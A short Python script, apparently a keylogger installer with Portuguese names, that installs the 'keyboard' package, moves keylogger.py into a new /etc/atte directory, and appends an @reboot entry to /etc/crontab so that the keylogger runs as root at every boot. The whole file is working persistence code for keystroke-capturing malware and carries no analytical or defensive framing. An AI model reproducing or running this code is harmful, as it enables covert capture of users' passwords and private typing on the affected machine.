import os


def dependencias():
    os.system('sudo apt-get install pip -y')
    os.system('sudo pip3 install keyboard')


def instalar():
    diretorio_atual = os.getcwd()
    os.mkdir('/etc/atte')
    os.system(f'sudo mv {diretorio_atual}/keylogger.py /etc/atte')
    cron = open('/etc/crontab', 'a')
    cron.write('@reboot         root   sudo  /usr/bin/python3 /etc/atte/keylogger.py')
    cron.close()


dependencias()
instalar()